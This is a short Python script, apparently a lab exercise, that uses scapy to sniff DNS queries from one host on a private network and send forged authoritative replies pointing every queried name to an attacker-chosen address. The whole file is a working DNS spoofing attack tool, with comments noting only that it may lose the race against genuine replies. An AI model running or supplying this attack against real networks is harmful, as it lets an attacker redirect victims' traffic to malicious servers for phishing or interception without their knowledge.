from scapy.all import *

# This code might not work very well because it has to beat actual DNS query time
# scapy response is quite slower than I thought....

def dnsSpoof(packet):
	spoofDNS = '192.168.40.129'
	dstip = packet[scapy.all.IP].src
	srcip = packet[scapy.all.IP].dst
	sport = packet[scapy.all.UDP].sport
	dport = packet[scapy.all.UDP].dport

	# Spoof DNS packet with only query, not response
	if packet.haslayer(scapy.all.DNSQR) and not packet.haslayer(scapy.all.DNSRR):
		dnsid = packet[scapy.all.DNS].id
		qd = packet[scapy.all.DNS].qd
		dnsrr = scapy.all.DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
		P_IP = scapy.all.IP(dst=dstip, src=srcip)
		P_UDP = scapy.all.UDP(dport=sport, sport=dport)
		P_DNS = scapy.all.DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
		spoofPacket = P_IP/P_UDP/P_DNS
		scapy.all.send(spoofPacket)

		print('SOURCE:{} -> DEST:{}'.format(dstip, srcip))
		print(spoofPacket.summary())

if __name__ == '__main__':
	print('DNS SPOOF START...')
	#sniff(filter='udp port 53', store=0, prn=dnsSpoof)
	sniff(filter='host 192.168.40.131 and udp port 53', store=0, prn=dnsSpoof)
